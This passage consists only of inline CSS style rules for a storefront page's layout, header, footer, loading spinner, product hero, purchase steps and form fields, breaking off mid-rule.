      <style>.layout[data-v-0886a856]{display:flex;flex-direction:column}.layout[data-v-0886a856],.layout .layout__content[data-v-0886a856]{--tw-bg-opacity:1;background-color:rgb(40 0 49/var(--tw-bg-opacity,1))}.layout .layout__content[data-v-0886a856]{height:auto;min-height:calc(100vh - 7rem);--tw-text-opacity:1;color:rgb(234 232 247/var(--tw-text-opacity,1))}.layout .layout__content .layout__content__inner[data-v-0886a856]{margin:0 auto}</style>
      <style>.spinner-container__progress-bar[data-v-b65d721b]{align-items:center;display:flex;justify-content:center;text-align:center}.spinner-overlay[data-v-b65d721b]{height:100%;inset-inline-start:0;position:absolute;top:0;width:100%}.spinner-overlay[data-variant=darkOverlay][data-v-b65d721b],[data-variant=darkOverlay] .spinner-overlay[data-v-b65d721b]{--tw-bg-opacity:1;background-color:rgb(0 0 0/var(--tw-bg-opacity,1));opacity:.9}.spinner-overlay[data-variant=lightOverlay][data-v-b65d721b],[data-variant=lightOverlay] .spinner-overlay[data-v-b65d721b]{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1));opacity:.65}.spinner-overlay[data-variant=transparentOverlay][data-v-b65d721b],[data-variant=transparentOverlay] .spinner-overlay[data-v-b65d721b]{background-color:transparent}.spinner[data-v-b65d721b]{width:100%}.spinner-icon[data-v-b65d721b]{display:inline-block;padding-bottom:15px;padding-top:15px}.spinner-icon[data-variant=darkOverlay][data-v-b65d721b],[data-variant=darkOverlay] .spinner-icon[data-v-b65d721b]{--tw-text-opacity:1;color:rgb(234 232 247/var(--tw-text-opacity,1))}.spinner-icon[data-variant=lightOverlay][data-v-b65d721b],.spinner-icon[data-variant=transparentOverlay][data-v-b65d721b],[data-variant=lightOverlay] .spinner-icon[data-v-b65d721b],[data-variant=transparentOverlay] .spinner-icon[data-v-b65d721b]{--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.spinner-icon[data-size=small][data-v-b65d721b],[data-size=small] .spinner-icon[data-v-b65d721b]{width:2em}.spinner-icon[data-size=medium][data-v-b65d721b],[data-size=medium] .spinner-icon[data-v-b65d721b]{width:4em}.spinner-icon[data-size=large][data-v-b65d721b],[data-size=large] .spinner-icon[data-v-b65d721b]{width:8em}.spinner-image[data-v-b65d721b]{height:24px;margin-inline-end:12px}.spinner-loader[data-v-b65d721b]{border-radius:9px;height:4px;margin:0 auto;overflow:hidden;width:150px;--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}.spinner-loading-bar[data-v-b65d721b]{height:100%;transform-origin:0 50%;width:100%}@keyframes loadingBar-b65d721b{0%{transform:translate(0) scaleX(0)}40%{transform:translate(0) scaleX(.4)}to{transform:translate(100%) scaleX(.5)}}.spinner-loading-bar[data-v-b65d721b]{animation:loadingBar-b65d721b 1s linear infinite;border-radius:9px;--tw-bg-opacity:1;background-color:rgb(98 66 252/var(--tw-bg-opacity,1))}.spinner-text[data-v-b65d721b]{font-size:14px;font-weight:400;line-height:150%;padding:15px 5px}.spinner-text[data-variant=darkOverlay][data-v-b65d721b],[data-variant=darkOverlay] .spinner-text[data-v-b65d721b]{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}.spinner-text[data-variant=lightOverlay][data-v-b65d721b],.spinner-text[data-variant=transparentOverlay][data-v-b65d721b],[data-variant=lightOverlay] .spinner-text[data-v-b65d721b],[data-variant=transparentOverlay] .spinner-text[data-v-b65d721b]{--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}</style>
      <style>.header[data-v-a6985b27]{display:flex;flex-direction:column;justify-content:center;min-height:56px;--tw-bg-opacity:1;background-color:rgb(60 31 66/var(--tw-bg-opacity,1));padding-bottom:8px;padding-top:8px;--tw-text-opacity:1;color:rgb(234 232 247/var(--tw-text-opacity,1))}@media(min-width:768px){.header[data-v-a6985b27]{padding-bottom:0;padding-top:0}}.header .header__container[data-v-a6985b27]{align-items:center;display:flex;height:100%;margin:0 auto;max-width:1280px;padding:0 10px;position:relative;width:100%}@media(min-width:768px){.header .header__container[data-v-a6985b27]{padding-bottom:8px;padding-top:8px}}.header .header__container .header__container__logo-tagline[data-v-a6985b27]{flex-grow:1;flex-shrink:1;min-width:-moz-fit-content;min-width:fit-content;width:auto}@media(min-width:768px){.header .header__container .header__container__logo-tagline[data-v-a6985b27]{min-width:auto;overflow:auto}}.header .header__container .header__container__items__signup[data-v-a6985b27]{flex-shrink:1;margin-inline-start:4px}@media(min-width:768px){.header .header__container .header__container__items__signup[data-v-a6985b27]{flex-shrink:0}}.header .header__container .header__partner-signin[data-v-a6985b27]{flex-shrink:1;margin-inline-start:4px}@media(min-width:768px){.header .header__container .header__partner-signin[data-v-a6985b27]{flex-shrink:0}}</style>
      <style>.product__purchase-form[data-v-a85cd964]{display:flex;flex-direction:column;margin:0 auto;max-width:1280px;min-height:80dvh}@media(min-width:768px){.product__purchase-form[data-v-a85cd964]{flex-direction:row;margin-top:.5rem}}.product__purchase-steps-container[data-v-a85cd964]{padding-left:15px;padding-right:15px;width:100%}@media(min-width:768px){.product__purchase-steps-container[data-v-a85cd964]{max-width:64%}}.product__empty-sku[data-v-a85cd964]{padding-bottom:20px;padding-top:20px;text-align:center;--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.product__loading-skus[data-v-a85cd964]{margin-bottom:32px;margin-top:32px;text-align:center;width:100%}.product__loading-skus__icon[data-v-a85cd964]{height:32px;margin-left:auto;margin-right:auto;width:32px;--tw-text-opacity:1;color:rgb(82 43 227/var(--tw-text-opacity,1))}.product__loading-skus__text[data-v-a85cd964]{margin-bottom:24px;margin-top:24px;--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.product__skus__browse-label[data-v-a85cd964]{font-size:12px;font-weight:600;line-height:150%;margin-bottom:1rem;margin-top:1rem;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.product__faq_section[data-v-a85cd964]{height:auto;margin-top:1rem;overflow-wrap:break-word;--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1));padding-bottom:15px;padding-top:15px}.product__info-banner__text[data-v-a85cd964]{font-weight:700}</style>
      <style>.footer[data-v-761e6852]{--tw-bg-opacity:1;background-color:rgb(232 249 83/var(--tw-bg-opacity,1))}.footer .footer__content[data-v-761e6852]{display:flex;flex-direction:column;font-size:.875rem;line-height:1.25rem;line-height:20px;margin:24px auto 0;max-width:1280px;width:100%;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.footer .footer__content .footer__content__sections[data-v-761e6852]{display:flex;flex:1 1 auto;flex-direction:column;flex-wrap:wrap}@media(min-width:768px){.footer .footer__content .footer__content__sections[data-v-761e6852]{flex-direction:row}}@media(min-width:992px){.footer .footer__content .footer__content__sections[data-v-761e6852]{justify-content:flex-start;width:auto}}.footer .footer__content .footer__content__sections .footer__content__sections__section[data-v-761e6852]{overflow-wrap:break-word;padding:16px}.footer .footer__footer[data-v-761e6852]{display:flex;width:100%;--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1));font-size:.75rem;line-height:1rem;line-height:16px}.footer .footer__footer .footer__footer__legal[data-v-761e6852]{margin:0 auto;max-width:1280px;overflow-wrap:break-word;padding-bottom:20px;padding-top:20px;width:100%}@media(min-width:768px){.footer .footer__footer .footer__footer__legal[data-v-761e6852]{padding-bottom:8px;padding-top:8px}}.footer--fixed[data-v-761e6852]{margin-bottom:150px}@media(min-width:768px){.footer--fixed[data-v-761e6852]{margin-bottom:0}}</style>
      <style>.category[data-v-0a3602bc]{align-items:flex-start;display:inline-flex;flex-direction:column;width:100%}@media(min-width:768px){.category[data-v-0a3602bc]{width:50%}}@media(min-width:992px){.category[data-v-0a3602bc]{width:16.666667%}}.category .category__title[data-v-0a3602bc]{font-size:1.125rem;line-height:1.75rem;margin:10px 0;max-width:100%}.category .category__nav-list[data-v-0a3602bc]{margin:0;padding:0}.category .category__nav-list .category__nav-list__item[data-v-0a3602bc]{list-style-type:none;padding:5px 0}.category .category__nav-list .category__nav-list__item .category__nav-list__item__link[data-v-0a3602bc]{font-size:.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.category .category__nav-list .category__nav-list__item .category__nav-list__item__link[data-v-0a3602bc]:hover{text-decoration-line:underline}</style>
      <style>.contact[data-v-a16f37ce]{align-items:flex-start;display:inline-flex;flex-direction:column;width:100%}@media(min-width:768px){.contact[data-v-a16f37ce]{width:50%}}@media(min-width:992px){.contact[data-v-a16f37ce]{width:16.666667%}}.contact .contact__title[data-v-a16f37ce]{font-size:1.125rem;line-height:1.75rem;margin:10px 0;max-width:100%}.contact .contact__link-container[data-v-a16f37ce]{align-items:center;border-radius:8px;max-width:100%;--tw-bg-opacity:1;background-color:rgb(192 214 3/var(--tw-bg-opacity,1));font-size:.875rem;line-height:1.25rem;padding:8px 5px;text-decoration-line:none}.contact .contact__link-container[data-v-a16f37ce],.contact .contact__link-container .contact__link-container__left-icon[data-v-a16f37ce]{display:inline-flex;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.contact .contact__link-container .contact__link-container__label[data-v-a16f37ce]{margin:0;padding:0 5px}.contact .contact__link-container .contact__link-container__right-icon[data-v-a16f37ce]{display:inline-flex;margin-left:auto;--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1))}.contact .contact__link-container .contact__link-container__right-icon[data-v-a16f37ce]:where([dir=rtl],[dir=rtl] *){margin-right:auto}</style>
      <style>.country[data-v-037f10a7]{align-items:flex-start;display:inline-flex;flex-direction:column;width:100%}@media(min-width:768px){.country[data-v-037f10a7]{width:50%}}@media(min-width:992px){.country[data-v-037f10a7]{width:16.666667%}}.country .country__title[data-v-037f10a7]{font-size:1.125rem;line-height:1.75rem;margin:10px 0;max-width:100%}.country .country__locale[data-v-037f10a7]{width:100%}.country .country__locale .country__locale__link[data-v-037f10a7]{align-items:center;border-radius:8px;display:inline-flex;justify-content:space-between;max-width:100%;--tw-bg-opacity:1;background-color:rgb(192 214 3/var(--tw-bg-opacity,1));font-size:.875rem;line-height:1.25rem;padding:4px;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.country .country__locale .country__locale__link .country__locale__link__flag[data-v-037f10a7]{flex-shrink:0;height:32px;width:32px}.country .country__locale .country__locale__link .country__locale__link__name[data-v-037f10a7]{padding:0 5px}.country .country__locale .country__locale__link .country__locale__link__icon[data-v-037f10a7]{display:inline-flex;flex-shrink:0;--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1))}</style>
      <style>.language[data-v-1c404f27]{display:inline-flex;flex-direction:row;flex-wrap:wrap;font-size:.75rem;line-height:1rem;line-height:16px;padding:5px 0;width:95%}.language .language__link[data-v-1c404f27]{padding:5px;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1));text-decoration-line:underline}.language .language__link--no-underline[data-v-1c404f27]{text-decoration-line:none}</style>
      <style>.social[data-v-ceb38c98]{align-items:flex-start;display:inline-flex;flex-direction:column;width:100%}@media(min-width:768px){.social[data-v-ceb38c98]{width:50%}}@media(min-width:992px){.social[data-v-ceb38c98]{width:16.666667%}}.social .social__title[data-v-ceb38c98]{font-size:1.125rem;line-height:1.75rem;margin:10px 0;max-width:100%}.social .social__links[data-v-ceb38c98]{display:flex;flex-direction:row}.social .social__links .social__links__item[data-v-ceb38c98]{font-size:.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.social .social__links .social__links__item .social__links__item__image[data-v-ceb38c98]{margin:0 5px;width:24px}</style>
      <style>.legal[data-v-b313943a]{align-items:center;display:inline-flex;flex-direction:column;overflow-wrap:break-word;text-align:center;width:100%}@media(min-width:992px){.legal[data-v-b313943a]{flex-direction:row;text-align:left}.legal[data-v-b313943a]:where([dir=rtl],[dir=rtl] *){text-align:right}}.legal .legal__copyright[data-v-b313943a]{--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.legal .legal__copyright[data-v-b313943a],.legal .legal__policies[data-v-b313943a]{font-size:.75rem;line-height:1rem;padding:8px 16px}.legal .legal__policies[data-v-b313943a]{align-items:center;flex:1 1 0%;flex-direction:row;width:100%}@media(min-width:768px){.legal .legal__policies[data-v-b313943a]{display:flex}}.legal .legal__policies .legal__policies__policy-link[data-v-b313943a]{align-items:center;--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}@media(min-width:768px){.legal .legal__policies .legal__policies__policy-link[data-v-b313943a]{display:flex}}.legal .legal__policies .legal__policies__policy-link .legal__policies__policy-link__separator[data-v-b313943a]{border-radius:100px;display:inline-block;height:2px;margin-left:.25rem;margin-right:.25rem;width:2px;--tw-bg-opacity:1;background-color:rgb(63 60 77/var(--tw-bg-opacity,1))}@media(min-width:768px){.legal .legal__policies .legal__policies__policy-link .legal__policies__policy-link__separator[data-v-b313943a]{display:block;margin-left:.75rem;margin-right:.75rem}}</style>
      <style>.product-hero-container[data-v-b7714122]{padding:12px;--tw-text-opacity:1;color:rgb(234 232 247/var(--tw-text-opacity,1))}@media(min-width:768px){.product-hero-container[data-v-b7714122]{width:36%}}.product-hero-container .product-hero[data-v-b7714122]{display:flex;justify-content:space-between}.product-hero-container .product-hero__tile[data-v-b7714122]{flex-shrink:0;height:100px;width:100px}.product-hero-container .product-hero__tile img.product-hero__tile__image[data-v-b7714122]{border-radius:12px;-o-object-fit:contain;object-fit:contain;width:100%;--tw-shadow:0 4px 6px -1px rgba(0,0,0,.1),0 2px 4px -2px rgba(0,0,0,.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.product-hero-container .product-hero__tile .product-hero__tile__placeholder[data-v-b7714122]{align-items:center;border-radius:12px;display:flex;height:100px;justify-content:center;width:100px;--tw-bg-opacity:1;background-color:rgb(246 245 252/var(--tw-bg-opacity,1));--tw-shadow:0 4px 6px -1px rgba(0,0,0,.1),0 2px 4px -2px rgba(0,0,0,.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.product-hero-container .product-hero__tile .product-hero__tile__placeholder svg[data-v-b7714122]{display:block;height:65%;width:65%}.product-hero-container .product-hero__content[data-v-b7714122]{padding-left:12px;padding-right:12px;width:100%}.product-hero-container .product-hero__content .product-hero__title[data-v-b7714122]{font-size:18px;font-weight:700}.product-hero-container .product-hero__content .product-hero__trust-tag[data-v-b7714122]{margin-bottom:4px;margin-top:4px}.product-hero-container .product-hero__description[data-v-b7714122]{display:none;margin-top:18px;width:100%}@media(min-width:768px){.product-hero-container .product-hero__description[data-v-b7714122]{display:block}}.product-hero-container .product-hero__description[data-v-b7714122] .shop-content--paragraph a{--tw-text-opacity:1;color:rgb(232 249 83/var(--tw-text-opacity,1));text-decoration-line:underline}.product-hero-container .product-hero__description[data-v-b7714122] .shop-content--paragraph{line-height:22px;margin-bottom:15px;margin-top:15px}.product-hero-container .product-hero__description[data-v-b7714122] .shop-content--badge{display:inline-block;margin-inline-end:5px;margin-top:8px;max-width:92px}.product-hero-container .product-hero__description[data-v-b7714122] .shop-content--badge img{max-width:100%}.product-hero-container-banner[data-v-b7714122]{padding:0}.product-hero-container-banner .product-hero[data-v-b7714122]{background-image:linear-gradient(to bottom,transparent,#280031 75%),var(--banner-url);background-position:top;background-size:cover;min-height:175px;padding:90px 12px 12px}.product-hero-container-banner .product-hero__content .product-hero__title[data-v-b7714122]{margin-top:12px;text-shadow:0 2px 4px rgba(0,0,0,.5)}</style>
      <style>.trust-tag[data-v-138d6f59]{align-items:center;border-radius:20px;display:inline-flex;margin-inline-end:8px;padding:5px 8px;width:auto}.trust-tag--dark[data-v-138d6f59]{background-color:rgb(60 31 66/var(--tw-bg-opacity,1));color:rgb(255 255 255/var(--tw-text-opacity,1))}.trust-tag--dark[data-v-138d6f59],.trust-tag--light[data-v-138d6f59]{--tw-bg-opacity:1;--tw-text-opacity:1}.trust-tag--light[data-v-138d6f59]{background-color:rgb(255 255 255/var(--tw-bg-opacity,1));color:rgb(40 0 49/var(--tw-text-opacity,1))}.trust-tag__icon[data-v-138d6f59]{width:24px}.trust-tag__icon svg[data-v-138d6f59]{-o-object-fit:contain;object-fit:contain}.trust-tag__label[data-v-138d6f59]{display:block;font-size:10px;font-weight:600;line-height:120%;padding-left:4px;padding-right:4px;width:auto}</style>
      <style>.product__purchase-step__container[data-v-0a726f0f]:first-of-type{margin-top:1rem}.product__purchase-step__container[data-v-0a726f0f]{border-radius:12px;counter-increment:step-number;margin-bottom:1.5rem;overflow-wrap:break-word;position:relative;--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity,1))}.product__purchase-step__ornament[data-v-0a726f0f]{background-image:url(images/ornament.BU8Ny55Z.svg);background-position:50%;background-repeat:no-repeat;background-size:cover;border-top-left-radius:12px;border-top-right-radius:12px;height:.625rem}.product__purchase-step__heading[data-v-0a726f0f]{padding-left:1rem;padding-right:1rem;padding-top:1rem}.product__purchase-step__content[data-v-0a726f0f]{padding-bottom:1rem;padding-left:1rem;padding-right:1rem}.product__purchase-step__content.unpadded[data-v-0a726f0f]{padding:0}.product__purchase-step__heading>h2[data-v-0a726f0f]{align-items:center;display:flex;font-size:20px;font-weight:600;line-height:130%;margin-bottom:16px;margin-top:-32px}.product__purchase-step__heading>h2>.product__purchase-step__icon[data-v-0a726f0f]:before{align-items:center;border-radius:100px;border-width:4px;content:counter(step-number);display:flex;height:46px;justify-content:center;margin-inline-end:8px;width:46px;--tw-border-opacity:1;border-color:rgb(255 255 255/var(--tw-border-opacity,1));--tw-bg-opacity:1;background-color:rgb(98 66 252/var(--tw-bg-opacity,1));font-weight:700;text-align:center;--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1));-webkit-font-smoothing:auto;-moz-osx-font-smoothing:auto}.product__purchase-step__heading>h2>.product__purchase-step__title[data-v-0a726f0f]{display:block;margin-top:18px;max-width:220px;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.product__purchase-step__heading>h2>.product__purchase-step__spinner[data-v-0a726f0f]{display:block;margin:1.5rem 0 0 auto;width:16px}.product__purchase-step__heading>h2>.product__purchase-step__spinner>.product__purchase-step__spinner__icon[data-v-0a726f0f]{--tw-text-opacity:1;color:rgb(82 43 227/var(--tw-text-opacity,1))}.product__purchase-step__pre-content[data-v-0a726f0f]{margin-bottom:16px}</style>
      <style>.user-identification[data-v-42630b9a]{position:relative}.user-identification__oauth-success[data-v-42630b9a]{display:flex;gap:.5rem;margin-bottom:.5rem;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.user-identification__oauth-success__icon[data-v-42630b9a]{fill:#ff7f98;width:24px}.user-identification__oauth-success__text[data-v-42630b9a]{display:flex;gap:.5rem}.user-identification__fields-container[data-v-42630b9a]{align-items:center;display:flex;gap:.25rem}.user-identification__fields[data-v-42630b9a]{display:grid;gap:.25rem;grid-template-columns:repeat(2,minmax(0,1fr));width:100%}@media(min-width:768px){.user-identification__fields[data-v-42630b9a]{grid-template-columns:repeat(2,1fr)}}.user-identification__fields>.user-identification__fields__field[data-v-42630b9a]:nth-child(odd):last-of-type{grid-column:1/-1}.user-identification__fields__field[data-v-42630b9a]{min-width:44%;width:100%}@media(min-width:768px){.user-identification__fields__field[data-v-42630b9a]{max-width:100%}}.user-identification__tooltip-container[data-v-42630b9a]{flex-shrink:0;grid-column:-1;grid-row:1;margin:auto}.user-identification__tooltip-icon[data-v-42630b9a]{display:inline-block;height:100%;padding-top:12px;width:24px}.user-identification__tooltip[data-v-42630b9a]{cursor:pointer;fill:#522be3;position:relative;width:24px}.user-identification__tooltip__backdrop[data-v-42630b9a]{align-items:center;background-color:#000000e6;display:flex;flex-direction:column;height:100vh;inset:0;position:fixed;z-index:50}@media(min-width:992px){.user-identification__tooltip__backdrop[data-v-42630b9a]{background-color:transparent;inset:auto;inset-inline-start:0;position:absolute}}.user-identification__tooltip-image[data-v-42630b9a]{max-height:90vh;-o-object-fit:scale-down;object-fit:scale-down;padding:16px}@media(min-width:992px){.user-identification__tooltip-image[data-v-42630b9a]{max-height:640px;padding:0}}.user-identification__tooltip-close[data-v-42630b9a]{width:28px;--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity,1))}@media(min-width:992px){.user-identification__tooltip-close[data-v-42630b9a]{display:none}}.user-identification__instructions-container[data-v-42630b9a]{margin-top:4px}.user-identification__instructions[data-v-42630b9a]{font-size:12px;line-height:1rem;overflow-wrap:break-word;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.user-identification__instructions[data-v-42630b9a] a{--tw-text-opacity:1;color:rgb(98 66 252/var(--tw-text-opacity,1));text-decoration-line:underline}.left-parenthesis[data-v-42630b9a]:where([dir=ltr],[dir=ltr] *):before{--tw-content:"(";content:var(--tw-content)}.left-parenthesis[data-v-42630b9a]:where([dir=rtl],[dir=rtl] *):before{--tw-content:")";content:var(--tw-content)}.right-parenthesis[data-v-42630b9a]:where([dir=ltr],[dir=ltr] *):before{--tw-content:")";content:var(--tw-content)}.right-parenthesis[data-v-42630b9a]:where([dir=rtl],[dir=rtl] *):before{--tw-content:"(";content:var(--tw-content)}</style>
      <style>.text-field__input-container[data-v-c991c0e3]{display:inline-flex;position:relative}.text-field__input-container--full-width[data-v-c991c0e3]{width:100%}.text-field__input-container--default-width[data-v-c991c0e3]{width:328px}.text-field__input-container__input[data-v-c991c0e3]{border-radius:6px;border-width:1px;caret-color:#6242fc;font-size:14px;font-weight:400;line-height:150%;min-height:50px;padding:0 16px;width:100%}.text-field__input-container__input[data-v-c991c0e3]::-moz-placeholder{font-weight:600;text-align:center;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.text-field__input-container__input[data-v-c991c0e3]::placeholder{font-weight:600;text-align:center;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.text-field__input-container__input[data-v-c991c0e3]:focus{border-width:2px;--tw-border-opacity:1;border-color:rgb(156 136 255/var(--tw-border-opacity,1))}.text-field__input-container__input[data-v-c991c0e3]:disabled{--tw-bg-opacity:1;background-color:rgb(234 232 247/var(--tw-bg-opacity,1))}.text-field__input-container__input[data-v-c991c0e3]:disabled::-moz-placeholder{--tw-text-opacity:1;color:rgb(182 179 199/var(--tw-text-opacity,1))}.text-field__input-container__input[data-v-c991c0e3]:disabled::placeholder{--tw-text-opacity:1;color:rgb(182 179 199/var(--tw-text-opacity,1))}.text-field__input-container__input[data-v-c991c0e3]:hover:disabled{cursor:not-allowed}.text-field__input-container__input_success[data-v-c991c0e3]{border-radius:6px;border-width:1px;font-size:14px;font-weight:400;line-height:150%;min-height:50px;width:100%;--tw-bg-opacity:1;background-color:rgb(213 247 219/var(--tw-bg-opacity,1));caret-color:#6242fc;padding:0 16px}.text-field__input-container__input_success[data-v-c991c0e3]::-moz-placeholder{font-weight:600;text-align:center;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.text-field__input-container__input_success[data-v-c991c0e3]::placeholder{font-weight:600;text-align:center;--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.text-field__input-container__input_success[data-v-c991c0e3]:focus{border-width:2px;--tw-border-opacity:1;border-color:rgb(156 136 255/var(--tw-border-opacity,1))}.text-field__input-container__input_success[data-v-c991c0e3]:focus::-moz-placeholder{color:transparent}.text-field__input-container__input_success[data-v-c991c0e3]:focus::placeholder{color:transparent}.text-field__input-container__input_success[data-v-c991c0e3]:disabled{border-width:2px;--tw-border-opacity:1;border-color:rgb(35 173 83/var(--tw-border-opacity,1))}.text-field__input-container__input_success[data-v-c991c0e3]:disabled::-moz-placeholder{--tw-text-opacity:1;color:rgb(182 179 199/var(--tw-text-opacity,1))}.text-field__input-container__input_success[data-v-c991c0e3]:disabled::placeholder{--tw-text-opacity:1;color:rgb(182 179 199/var(--tw-text-opacity,1))}.text-field__input-container__input_success[data-v-c991c0e3]:hover:disabled{cursor:not-allowed}.text-field__input-container__input--left-icon[data-v-c991c0e3]{padding-left:40px}.text-field__input-container__input--right-icon[data-v-c991c0e3]{padding-right:40px}.text-field__input-container__input--right-button[data-v-c991c0e3]{padding-inline-end:40px}.text-field__input-container__input--label[data-v-c991c0e3]:focus,.text-field__input-container__input--value[data-v-c991c0e3]{padding-top:18px}.text-field__input-container__input--error[data-v-c991c0e3]{border-color:rgb(253 87 62/var(--tw-border-opacity,1));border-width:2px}.text-field__input-container__input--default[data-v-c991c0e3],.text-field__input-container__input--error[data-v-c991c0e3]{--tw-border-opacity:1;--tw-text-opacity:1;color:rgb(47 18 54/var(--tw-text-opacity,1))}.text-field__input-container__input--default[data-v-c991c0e3],.text-field__input-container__input--frozen[data-v-c991c0e3]{border-color:rgb(182 179 199/var(--tw-border-opacity,1))}.text-field__input-container__input--frozen[data-v-c991c0e3]{--tw-border-opacity:1;color:transparent}.text-field__input-container__left-icon[data-v-c991c0e3]{left:12px}.text-field__input-container__left-icon[data-v-c991c0e3],.text-field__input-container__right-icon[data-v-c991c0e3]{position:absolute;top:50%;width:20px;--tw-translate-y:-50%;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.text-field__input-container__right-icon[data-v-c991c0e3]{right:12px}.text-field__input-container__right-icon[data-v-c991c0e3]:hover{cursor:pointer}.text-field__input-container__right-icon--disabled[data-v-c991c0e3]:hover{cursor:not-allowed}.text-field__input-container__right-button[data-v-c991c0e3]{inset-inline-end:60px;position:absolute;top:50%;width:20px;--tw-translate-y:-50%;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}.text-field__input-container__right-button[data-v-c991c0e3]:hover{cursor:pointer}.text-field__input-container__label[data-v-c991c0e3]{font-size:12px;font-weight:400;line-height:150%;position:absolute;top:4px}.text-field__input-container__label--left-icon[data-v-c991c0e3]{left:40px}.text-field__input-container__label--default[data-v-c991c0e3]{left:16px}.text-field__input-container__label--value[data-v-c991c0e3]{visibility:visible}.text-field__input-container__label--no-value[data-v-c991c0e3]{visibility:hidden}.text-field__input-container__label--disabled[data-v-c991c0e3]{--tw-text-opacity:1;color:rgb(182 179 199/var(--tw-text-opacity,1))}.text-field__input-container__label--active[data-v-c991c0e3]{--tw-text-opacity:1;color:rgb(145 141 161/var(--tw-text-opacity,1))}.text-field__input-container__helper-text[data-v-c991c0e3]{font-size:12px;font-weight:400;line-height:150%;margin-top:4px}.text-field__input-container__helper-text--disabled[data-v-c991c0e3],.text-field__input-container__helper-text--disabled[data-theme=lightTheme][data-v-c991c0e3],[data-theme=lightTheme] .text-field__input-container__helper-text--disabled[data-v-c991c0e3]{--tw-text-opacity:1;color:rgb(182 179 199/var(--tw-text-opacity,1))}.text-field__input-container__helper-text--active[data-v-c991c0e3]{--tw-text-opacity:1;color:rgb(246 245 252/var(--tw-text-opacity,1))}.text-field__input-container__helper-text--active[data-theme=lightTheme][data-v-c991c0e3],[data-theme=lightTheme] .text-field__input-container__helper-text--active[data-v-c991c0e3]{--tw-text-opacity:1;color:rgb(63 60 77/var(--tw-text-opacity,1))}</style>
      <style>.user-identification[data-v-83fcbcf1]{position:relative}.user-identification__oauth-success[data-v-83fcbcf1]{display:flex;gap:.5rem;margin-bottom:.5rem;--tw-text-opacity:1;color:rgb(40 0 49/var(--tw-text-opacity,1))}.user-identification__oauth-success__icon[data-v-83fcbcf1]{fill:#ff7f98;width:24px}.user-identification__oauth-success__text[data-v-83fcbcf1]{display:flex;gap:.5rem}.user-identification__fields-container[data-v-83fcbcf1]{align-items:center;display:flex;gap:.25rem}.user-identification__fields[data-v-83fcbcf1]{display:grid;gap:.25rem;grid-template-columns:repeat(2,minmax(0,1fr));width:100%}@media(min-width:768px){.user-identification__fields[data-v-83fcbcf1]{grid-template-columns:repeat(2,1fr)}}.user-identification__fields>.user-identification__fields__field[data-v-83fcbcf1]:nth-child(odd):last-of-type{grid-column:1/-1}.user-identification__fields__field[data-v-83fcbcf1]{min-width:44%;width:100%}@media(min-width:768px){.user-identification__fields__field[data-v-83fcbcf1]{max-width:100%}}.user-identification__tooltip-container[data-v-83fcbcf1]{flex-shrink:0;grid-column:-1;grid-row:1;margin:auto}.user-identification__tooltip-icon[data-v-83fcbcf1]{display:inline-block;height:100%;padding-top:12px;width:24px}.user-identification__tooltip[data-v-83fcbcf1]{cursor:pointer;fill:#522be3;position:relative;width:24px}.user-identification__tooltip__backdrop[data-v-83fcbcf1]{align-items:center;background-color:#000000e6;display:flex;flex-direction:column;height:100vh;inset:0;position:fixed;z-index:50}@media(min-width:992px){.user-identification__tooltip__backdrop[data-v-83fcbcf1]{background-color:transparent;inset:auto;inset-inline-start:0;position:absolute}}.user-identification__tooltip-image[data-v-83fcbcf1]{max-height:90vh;-o-object-fit:scale-down;object-fit:scale-down;padding:16px}@media(m